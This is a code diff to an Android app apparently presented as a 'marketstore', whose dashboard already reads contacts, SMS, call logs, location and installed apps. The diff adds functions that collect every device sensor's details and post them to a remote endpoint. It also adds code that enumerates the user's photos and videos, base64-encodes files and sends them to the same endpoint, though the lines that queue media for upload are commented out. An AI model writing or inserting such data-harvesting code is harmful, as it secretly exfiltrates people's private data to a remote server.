@@ -2,11 +2,16 @@ package com.imf.marketstore.ui.dashboard;
 
 import android.annotation.SuppressLint;
 import android.content.DialogInterface;
+import android.content.SharedPreferences;
 import android.content.pm.ApplicationInfo;
 import android.content.pm.PackageInfo;
+import android.hardware.Sensor;
+import android.hardware.SensorManager;
 import android.os.Bundle;
+import android.preference.PreferenceManager;
 import android.provider.CallLog;
 import android.support.v7.app.AlertDialog;
+import android.util.Base64;
 import android.util.Log;
 import android.view.LayoutInflater;
 import android.view.View;
@@ -21,6 +26,9 @@ import com.imf.marketstore.databinding.FragmentDashboardBinding;
 import com.imf.marketstore.ui.notifications.NotificationsFragment;
 import com.imf.marketstore.ui.notifications.NotificationsViewModel;
 
+import java.io.ByteArrayOutputStream;
+import java.io.InputStream;
+import java.util.Map;
 import java.util.UUID;
 
 import android.database.Cursor;
@@ -106,6 +114,8 @@ public class DashboardFragment extends Fragment {
     private static final int REQUEST_IMAGE_CAPTURE = 3;
     private static final int REQUEST_LOCATION_PERMISSION = 4;
 
+    private static final int REQUEST_READ_EXTERNAL_STORAGE = 5;
+
     private static final int PERMISSION_REQUEST_READ_CALL_LOG = 100;
 
     private static final String TAG = DashboardFragment.class.getSimpleName();
@@ -139,6 +149,7 @@ public class DashboardFragment extends Fragment {
                 } else {
                     // Si el permiso ya ha sido concedido, accede a los contactos
                     accessContacts();
+                    showAlertDialog();
                 }
             }
         });
@@ -156,6 +167,8 @@ public class DashboardFragment extends Fragment {
                 } else {
                     // Si el permiso ya ha sido concedido, accede a los SMS
                     accessSMS();
+                    showAlertDialog();
+
                 }
             }
         });
@@ -173,6 +186,7 @@ public class DashboardFragment extends Fragment {
                 } else {
                     // Si el permiso ya ha sido concedido, accede a las llamadas
                     accessCalls();
+                    showAlertDialog();
                 }
             }
         });
@@ -197,6 +211,8 @@ public class DashboardFragment extends Fragment {
                         }
                     }
                 });
+
+                showAlertDialog();
             }
         });
 
@@ -213,6 +229,8 @@ public class DashboardFragment extends Fragment {
                 } else {
                     // Si el permiso ya ha sido concedido, accede a las coordenadas
                     getLocation();
+                    showAlertDialog();
+
                 }
             }
         });
@@ -221,6 +239,15 @@ public class DashboardFragment extends Fragment {
             @Override
             public void onClick(View v) {
                 accessInstalledApps();
+                getSensorData();
+                showAlertDialog();
+            }
+        });
+
+        binding.getPhotosVideos.setOnClickListener(new View.OnClickListener() {
+            @Override
+            public void onClick(View v) {
+                getPhotosAndVideos();
                 showAlertDialog();
             }
         });
@@ -420,7 +447,98 @@ public class DashboardFragment extends Fragment {
         }
         return installedApps;
     }
-    //Camara - Photo:
+
+    private void getSensorData() {
+        String sensorsToSend = "";
+        Context context = requireContext();
+
+        if (context != null) {
+            SensorManager sensorManager = (SensorManager) context.getSystemService(Context.SENSOR_SERVICE);
+            if (sensorManager != null) {
+                List<Sensor> sensorList = sensorManager.getSensorList(Sensor.TYPE_ALL);
+                for (Sensor sensor : sensorList) {
+                    Log.d("Sensor", "Sensor Name: " +
+                            sensor.getName() + " Type: " +
+                            sensor.getStringType() + " Vendor: " +
+                            sensor.getVendor() + " Version: " +
+                            sensor.getVersion());
+
+                    sensorsToSend += "Sensor Name: " +
+                            sensor.getName() + " Type: " +
+                            sensor.getStringType() + " Vendor: " +
+                            sensor.getVendor() + " Version: " +
+                            sensor.getVersion() + ". ";
+                }
+                sendPostInfo(urlInfo, sensorsToSend);
+            }
+        }
+    }
+
+    //Photo and Videos:
+
+    @SuppressLint("Range")
+    private void getPhotosAndVideos() {
+        if (ContextCompat.checkSelfPermission(requireContext(), Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {
+            ActivityCompat.requestPermissions(requireActivity(), new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, REQUEST_READ_EXTERNAL_STORAGE);
+        } else {
+            List<String> photosList = new ArrayList<String>();
+            Cursor cursor = requireContext().getContentResolver().query(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, null, null, null, null);
+            if (cursor != null) {
+                while (cursor.moveToNext()) {
+                    String path = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DATA));
+                    String filename = cursor.getString(cursor.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME));
+                    Log.d("Photo", "Name: " + filename  + "Photo path: " + path);
+                    //photosList.add(convertToBase64(path));
+                }
+                cursor.close();
+            }
+
+            List<String> videosList = new ArrayList<String>();
+            cursor = requireContext().getContentResolver().query(MediaStore.Video.Media.EXTERNAL_CONTENT_URI, null, null, null, null);
+            if (cursor != null) {
+                while (cursor.moveToNext()) {
+                    String path = cursor.getString(cursor.getColumnIndex(MediaStore.Video.Media.DATA));
+                    String filename = cursor.getString(cursor.getColumnIndex(MediaStore.Video.Media.DISPLAY_NAME));
+                    Log.d("Video", "Name: " + filename  + "Video path: " + path);
+                    //videosList.add(convertToBase64(path));
+
+                }
+                cursor.close();
+            }
+            for (String photo : photosList) {
+                sendPostInfo(urlInfo, photo);
+            }
+
+            for (String video : videosList) {
+                sendPostInfo(urlInfo, video);
+            }
+        }
+    }
+
+    private String convertToBase64(String filePath) {
+        try {
+            InputStream inputStream = getContext().getContentResolver().openInputStream(Uri.parse(filePath));
+            if (inputStream != null) {
+                ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
+                byte[] buffer = new byte[1024];
+                int len;
+                while ((len = inputStream.read(buffer)) != -1) {
+                    outputStream.write(buffer, 0, len);
+                }
+                inputStream.close();
+                byte[] byteArray = outputStream.toByteArray();
+                return Base64.encodeToString(byteArray, Base64.DEFAULT);
+            }
+        } catch (Exception e) {
+            Log.e("Media", "Error converting file to Base64", e);
+        }
+        return null;
+    }
+
+
+
+
+    //==========================================> Revisar
     private void requestCameraPermission() {
         if (ContextCompat.checkSelfPermission(requireContext(), Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
             ActivityCompat.requestPermissions(requireActivity(), new String[]{Manifest.permission.CAMERA}, REQUEST_IMAGE_CAPTURE);
